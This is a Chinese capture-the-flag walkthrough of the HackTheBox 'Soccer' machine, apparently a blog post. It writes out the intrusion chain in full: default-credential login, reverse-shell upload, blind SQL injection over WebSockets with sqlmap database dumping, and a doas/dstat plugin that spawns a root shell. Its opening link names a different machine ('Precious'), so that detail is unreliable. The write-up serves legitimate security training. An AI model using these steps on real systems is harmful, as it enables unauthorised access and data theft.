
![在这里插入图片描述](https://img-blog.csdnimg.cn/3b18a58c2ef54ca68ff2b67d2152f030.png)


靶机网址：
```
https://app.hackthebox.com/machines/Precious
```
# 枚举
使用nmap枚举靶机
```
nmap -sC -sV 10.10.11.194
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f9f29bb981cd4a4e88a7c7bcfa2b507a.png)

机子开放了22，80和9091端口，我们本地dns解析这个域名
```
echo "10.10.11.194 soccer.htb" >> /etc/hosts
```
然后fuzz网站根目录
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,301 -u http://soccer.htb/FUZZ
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/80f2b4a8c037414db4180abb2a973f60.png)

扫到一个目录，去网站上看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/98f46b9018934592aa5dbcb08623220e.png)

看起来这是一个后台的登录页面，这个后台的框架名叫Tiny File Manager，在github上是开源的
```
https://github.com/prasathmani/tinyfilemanager
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/da21acd51eb24ed2a45e5c962c6e290f.png)

在这下面可以看到默认的用户名和密码，我们登录试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/75db752534834aecb857ee38fbf8a6de.png)

登录后是一个文件上传的页面，我试了一下，发现可以上传文件的目录为/tiny/uploads

进入到这个目录，点击右上角的upload上传rev shell

我使用的rev shell：
```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
```
需要更改ip和port参数

![在这里插入图片描述](https://img-blog.csdnimg.cn/f5b3e43e99044d5da7c2428c00115cc3.png)

然后nc监听这个端口，回到网页上传文件


![在这里插入图片描述](https://img-blog.csdnimg.cn/159ffc040874463c9a9ad342b548ea45.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/632f31379b024519a0d7e333e955602e.png)


上传成功后点击这个图标访问rev shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/ceb6ae9ac9874b71b55382c4741f7b23.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/7dd1dd331db04dd78a961899650eab71.png)

成功获得交互shell

现在使用linpeas脚本搜集主机信息
```
https://github.com/carlospolop/PEASS-ng/releases/tag/20221218
```
```
chmod +x linpeas.sh
./linpeas.sh
```

通过这个脚本，在这台机子上发现了很多漏洞，但是都用不了，应该是打补丁了

在下面，脚本列出的nginx默认配置里发现了一个子域名



![在这里插入图片描述](https://img-blog.csdnimg.cn/afd64afe47964e8a85c9e046aa420d7f.png)

我们本地dns解析这个域名

```
echo "10.10.11.194 soc-player.soccer.htb" >> /etc/hosts
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1961c0cd33a2407da94bd225f0f19f2c.png)

# 通过WebSockets进行SQL注入

现在访问这个域名

![在这里插入图片描述](https://img-blog.csdnimg.cn/3f34d35c8ea445059f5a2f4605396a5a.png)

发现左上角有一个注册模块，我们注册一个账号

然后登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/c43eb8bfccf842bab3ea7da53cfce348.png)

登录后就会跳转到这个页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/015370d08f524840a4b74ea21fb83a7f.png)

似乎是要检查我们的票证，通过查看这个页面的源代码，可以发现突破点

![在这里插入图片描述](https://img-blog.csdnimg.cn/b4958b20e5304029b0d7dc11633dcadd.png)

它使用的是WebSockets，然后将我们输入的发送到这个URL "ws://soc-player.soccer.htb:9001"

![在这里插入图片描述](https://img-blog.csdnimg.cn/a9a0a1981740462abefbfc8e767eb46a.png)

这里告诉我们，传递的参数为id，一会sql测试的时候需要用到它

现在需要通过WebSockets进行SQL注入测试，通过google，找到了这篇文章
```
https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/06f22f65bcd44f25a01a4e4cacf33fcf.png)

我们将这个代码复制下来，新建一个python文件，并粘贴进去

![在这里插入图片描述](https://img-blog.csdnimg.cn/84f8248bf24946e89dbb4490786823c2.png)

根据那个网页源代码，修改ws_server和data参数

然后安装websocket模块
```
pip3 install websocket-client
```

安装完成后运行脚本

```
python3 web_socket.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0c640441f67f4fdf86b75c368586e8ee.png)

现在使用sqlmap进行测试
```
sqlmap -u http://localhost:8081/?id=1 --dump-all --exclude-sysdbs
```
```
--dump-all：查找并转储找到的所有数据库
--exclude-sysdbs：不会在默认数据库上浪费时间
```
因为是时间盲注，所以需要等待几十分钟

![在这里插入图片描述](https://img-blog.csdnimg.cn/66b22c42d8b247388811c6e9fc6f8371.png)

现在得到用户名和密码了，使用ssh登录即可
```
ssh player@10.10.11.194
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e08abb1c68f64f609ea7fb4ee44d40b1.png)


根据之前linpeas脚本搜集到的信息，发现doas程序有suid权限，doas也不是默认安装的程序，根据HTB机子的规律，这个程序多半是突破点了

![在这里插入图片描述](https://img-blog.csdnimg.cn/bfe3e4bc248a4947aac61575402f0516.png)

# 什么是Doas
```
https://zh.m.wikipedia.org/zh-hans/Doas
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/dc6f5c9516a44896afebef83b6bd2357.png)

简单来说，Doas是一个与Sudo具有相同功能的软件

寻找doas软件的配置
```
find / -type f -name doas.conf 2>/dev/null
```



![在这里插入图片描述](https://img-blog.csdnimg.cn/988934b2cc824040bf26ed9bf7e9ca02.png)

提示允许用户player用dstat使用root
# Dstat插件

通过查看dstat程序的官方文档，发现我们可以编写插件并执行，名称必须为dstat_*.py，插件存放的目录为/usr/local/share/dstat/

![在这里插入图片描述](https://img-blog.csdnimg.cn/28a13513594f4e638084036560eacf82.png)

我们可以往插件里写入rev shell获得root权限

我们移动到这个目录下，创建一个名为dstat_baimao.py的文件

```
cd /usr/local/share/dstat/
touch dstat_baimao.py
chmod 777 dstat_baimao.py
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f3a91966a76e4e919691e8469f03b5be.png)

写入代码
```
import subprocess

subprocess.run(["bash"]) 
#启动一个新的 bash shell
```







然后使用Doas执行Dstat插件
```
doas /usr/bin/dstat --baimao
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6d9d79649dcb4aa1a7005b721809d87d.png)

成功获得root权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/f754200e76124dd88cde581744390c6e.png)

